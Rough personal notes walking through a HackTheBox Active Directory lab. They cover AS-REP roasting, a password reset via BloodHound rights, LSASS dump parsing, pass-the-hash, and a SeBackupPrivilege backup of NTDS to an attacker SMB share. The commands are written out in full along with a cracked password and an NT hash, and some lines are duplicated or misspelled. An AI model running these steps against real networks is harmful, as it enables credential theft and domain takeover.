rpc locked down
smb open, --shares showed a profiles$ share, and a ipc$ share open for anonymous
There was also a forensic share, with the desc "forensic audit share" not readable, though
--rid gave use a thousand users, almost all of them were valid (validated using kerbrute)
we also do ls on the profiles$ share, and since the profiles are potential usernames, validate them using kerbrute.
Now, we find only 3 valid ones. support, audit2020, svc_backup

upon running an asrep roast, we find the hash for support user
`impacket-GetNPUsers -request blackfield.local/ -usersfile users.txt -format john -outputfile hashes.asreproast` -- `#00^BlackKnight`

Looking into bloodhound, we see that the user support has force change password on user audit2020, so we use bloodyAD to reset it
`bloodyAD --host 10.129.229.17 -d blackfield.local -u support -p '#00^BlackKnight' set password 'audit2020' 'newPassword1!'`

The files were too big, to `get` from smbclient
had to go with mount -t cifs
`sudo mount -t cifs //10.129.229.17/forensic /tmp/audit -o 'username=audit2020,password=newPassword1!'` --nothing works

we look into ippsec's walkthrough and copy the hash, but the steps are so

`unzip lsass.zip`
`pypykatz lsa minidump lsass.DMP` (pip3 install pypykatz)
here, we find NTHash for svc_backup and administrator, and dc01$
(the ones that end with $ have long string randomly generated passwords)

we try authenticating with nxc smb -H
works for svc_backup 9658d1d1dcd9250115e2205d9f48400d
nxc winrm also works

Looking into bloodhound, we see the user svc_backup is a member of "Backup Operators"
whoami /priv shows we have seBackupPrivilege
Which means we can look into registry and stuff, copy all sorts of high-value files
Can either use diskshadow, or wbadmin. we use wbadmin

setup ntfs disk, mount it and point it using smb.conf
mount from target, take backup of ndts dir
`net use x: \\10.10.14.45\SendMeYoData` 
`cd x:\`
`echo Y | wbadmin start backup -backuptarget:\\10.10.14.45\SendMeYoData -include C:\Windows\ndts`

`net use x: \\10.10.14.45\SendMeYoData` --------`cd x:\`--------`net use x: /delete`
`cd x:\`
`echo Y | wbadmin start backup -backuptarget:\\10.10.14.45\SendMeYoData -include C:\Windows\ndts`

`reg save hklm\system system.hive`

download it to kali
`impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL`
Use the admin hash to winrm into admin

---
---
---
failed method
whoami /priv shows we have seBackupPrivilege
so we can just download the system and sam hives

`reg save hklm\system C:\Users\THMBackup\system.hive`
`reg save hklm\sam C:\Users\THMBackup\sam.hive`

We could never get it over to our machine